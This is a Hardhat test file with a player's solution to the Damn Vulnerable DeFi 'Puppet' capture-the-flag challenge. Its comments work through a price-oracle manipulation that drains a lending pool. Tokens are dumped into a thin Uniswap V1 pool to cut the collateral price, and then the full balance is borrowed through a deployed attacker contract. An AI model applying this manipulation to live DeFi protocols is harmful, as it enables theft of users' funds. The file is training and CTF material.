const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json")
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json")

const { ethers } = require("hardhat")
const { expect } = require("chai")
const { setBalance } = require("@nomicfoundation/hardhat-network-helpers")

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return (tokensSold * 997n * etherInReserve) / (tokensInReserve * 1000n + tokensSold * 997n)
}

describe("[Challenge] Puppet", function () {
    let deployer, player
    let token, exchangeTemplate, uniswapFactory, uniswapExchange, lendingPool

    const UNISWAP_INITIAL_TOKEN_RESERVE = 10n * 10n ** 18n
    const UNISWAP_INITIAL_ETH_RESERVE = 10n * 10n ** 18n

    const PLAYER_INITIAL_TOKEN_BALANCE = 1000n * 10n ** 18n
    const PLAYER_INITIAL_ETH_BALANCE = 25n * 10n ** 18n

    const POOL_INITIAL_TOKEN_BALANCE = 100000n * 10n ** 18n

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        ;[deployer, player] = await ethers.getSigners()

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer)
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer)

        setBalance(player.address, PLAYER_INITIAL_ETH_BALANCE)
        expect(await ethers.provider.getBalance(player.address)).to.equal(PLAYER_INITIAL_ETH_BALANCE)

        // Deploy token to be traded in Uniswap
        token = await (await ethers.getContractFactory("DamnValuableToken", deployer)).deploy()

        // Deploy a exchange that will be used as the factory template
        exchangeTemplate = await UniswapExchangeFactory.deploy()

        // Deploy factory, initializing it with the address of the template exchange
        uniswapFactory = await UniswapFactoryFactory.deploy()
        await uniswapFactory.initializeFactory(exchangeTemplate.address)

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await uniswapFactory.createExchange(token.address, { gasLimit: 1e6 })
        const { events } = await tx.wait()
        uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange)

        // Deploy the lending pool
        lendingPool = await (
            await ethers.getContractFactory("PuppetPool", deployer)
        ).deploy(token.address, uniswapExchange.address)

        // Add initial token and ETH liquidity to the pool
        await token.approve(uniswapExchange.address, UNISWAP_INITIAL_TOKEN_RESERVE)
        await uniswapExchange.addLiquidity(
            0, // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock("latest")).timestamp * 2, // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        )

        // Ensure Uniswap exchange is working as expected
        expect(await uniswapExchange.getTokenToEthInputPrice(10n ** 18n, { gasLimit: 1e6 })).to.be.eq(
            calculateTokenToEthInputPrice(10n ** 18n, UNISWAP_INITIAL_TOKEN_RESERVE, UNISWAP_INITIAL_ETH_RESERVE)
        )

        // Setup initial token balances of pool and player accounts
        await token.transfer(player.address, PLAYER_INITIAL_TOKEN_BALANCE)
        await token.transfer(lendingPool.address, POOL_INITIAL_TOKEN_BALANCE)

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(await lendingPool.calculateDepositRequired(10n ** 18n)).to.be.eq(2n * 10n ** 18n)

        expect(await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)).to.be.eq(
            POOL_INITIAL_TOKEN_BALANCE * 2n
        )
    })

    it("Execution", async function () {
        /** CODE YOUR SOLUTION HERE */

        // studying the contracts, we realize, the only way to drain th epool is by calling the "borrow" function on the PuppetPool
        // to calculate the required deposit, the pool uses the following formula:
        // depositRequired = amount * ( UniETHPoolBalance * (10 ** 18) / UniDVTPoolBalance ) * 2 / 10 ** 18
        // to drain the pool, we need to set amount = POOL_INITIAL_TOKEN_BALANCE
        // initially, the Uniswap pool has 10 ETH & 10 DVT
        // at the beginning, we get the following result: depositRequired = amount * ( UniETHPoolBalance / UniDVTPoolBalance ) * 2 = amount * 2
        // so, if we would like to drain the pool, we would need 10**5 * 2 ETH
        // however, if we could substantially decrease UniETHPoolBalance & increase UniDVTPoolBalance, then the amount of ETH required would be much less
        // Uniswap pools use the following constant product formula: k = x * y => at the beginning, this is: 10 ETH * 10 DVT = 100
        // we have 1000 DVT available, so if we swap them for ETH, we would get: 1010 * ?ETH = 100 =>
        // so, the pool should contain 100 / 1010 = 0.099 ETH after the swap =>
        // now, let's put those values into the formula used by the PuppetPool and let's see how much ETH we need to drain the pool =>
        // depositRequired = 10**5 * ( 0.099 / 1010 ) * 2 = 19.6 ETH
        // swapping our 1000 DVT on Uniswap provides us with ~9.9 ETH => so, we still need to send ~10 ETH to the attacker contract from our player account

        // let's create an attacker contract and transfer 1000 DVT & 10 ETH to it from the player
        // in the attacker contract, we need to give approval to Uniswap before  we can swap
        // then, we swap our 1000 DVT into 9.9 ETH => thi creates the pool imbalance we discussed above
        // finally, we can call "borrow" on the PuppetPool and we only need to provide ~19.7 ETH to drain the pool

        const attackerFactory = await ethers.getContractFactory("PuppetAttacker")
        const attacker = await attackerFactory.deploy(
            uniswapExchange.address,
            lendingPool.address,
            token.address,
            player.address,
            PLAYER_INITIAL_TOKEN_BALANCE,
            POOL_INITIAL_TOKEN_BALANCE
        )

        //transfer DVT's to attacker
        await token.connect(player).transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE)

        //transfer ETH to attacker
        await player.sendTransaction({
            to: attacker.address,
            value: ethers.utils.parseEther("10"),
        })

        await attacker.attack()
    })

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */

        // Player executed a single transaction => we need to execute 2 txn =>
        // One to send DVT's to the attacker contract and a another to forward ETH to the attacker contract
        expect(await ethers.provider.getTransactionCount(player.address)).to.eq(2)

        // Player has taken all tokens from the pool
        expect(await token.balanceOf(lendingPool.address)).to.be.eq(0, "Pool still has tokens")

        expect(await token.balanceOf(player.address)).to.be.gte(
            POOL_INITIAL_TOKEN_BALANCE,
            "Not enough token balance in player"
        )
    })
})
